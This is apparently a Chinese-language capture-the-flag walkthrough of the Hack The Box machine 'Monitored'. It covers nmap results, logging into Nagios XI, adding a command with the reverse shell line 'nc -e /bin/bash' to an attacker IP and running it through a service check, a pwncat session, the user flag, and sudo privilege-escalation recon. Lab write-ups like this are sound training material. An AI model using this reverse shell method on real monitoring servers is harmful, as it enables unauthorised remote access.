# Monitored

:::info

Difficulty: Medium

Operating System: Linux

:::

## nmap 信息搜集

```plaintext
Nmap scan report for 10.10.11.248
Host is up (0.13s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 61e2e7b41b5d46dc3b2f9138e66dc5ff (RSA)
|   256 2973c5a58daa3f60a94aa3e59f675c93 (ECDSA)
|_  256 6d7af9eb8e45c2026ad58d4db3a3376f (ED25519)
80/tcp   open  http       Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
|_http-title: Nagios XI
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
|_http-server-header: Apache/2.4.56 (Debian)
| tls-alpn:
|_  http/1.1
5667/tcp open  tcpwrapped
```

并且通过 UDP 扫描，发现 SNMP（161）也在运行

## 探测 web 服务

添加 hosts 记录

```plaintext
10.10.11.248 nagios.monitored.htb
```

尝试直接访问

![直接访问 /](img/image_20240132-123225.png)

## SNMP 信息探测

## 登陆后利用

![成功登录](img/image_20240104-130436.png)

```plaintext
Configure ->  Commands ->  Add New
```

![Commands](img/image_20240105-130554.png)

加上一个反向 shell 的命令

```shell
nc -e /bin/bash 10.10.16.11 9999
```

:::note

建议使用 netcat 进行反向 shell，直接 bash -c 不知道为什么没有成功

:::

![add reverse shell](img/image_20240109-130936.png)

```plaintext
Monitoring -> Services -> Add New
```

![Services](img/image_20240111-131120.png)

执行 `Run Check Command`

成功得到反弹shell

```shell
┌─[randark@randark-Parrot]─[~/tmp/Hackthebox-Monitored]
└──╼ $pwncat-cs -lp 9999
[13:07:28] Welcome to pwncat 🐈!                                                                                                                                                                                            __main__.py:164
[13:14:12] received connection from 10.10.11.248:53958                                                                                                                                                                           bind.py:84
[13:14:14] 0.0.0.0:9999: normalizing shell path                                                                                                                                                                              manager.py:957
[13:14:16] 10.10.11.248:53958: registered new host w/ db                                                                                                                                                                     manager.py:957
(local) pwncat$ back
(remote) nagios@monitored:/home/nagios$ whoami
nagios
```

## user pwned

```shell
(remote) nagios@monitored:/home/nagios$ cat user.txt 
5a9412d810390fed6e458fe5dba7bf30
```

## 提权探测

```plaintext title="sudo -l"
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```

## 参考

[Acters/Monitored.sh - Github Gist](https://gist.github.com/Acters/058b0421dba28860afd5559db6a7afee)
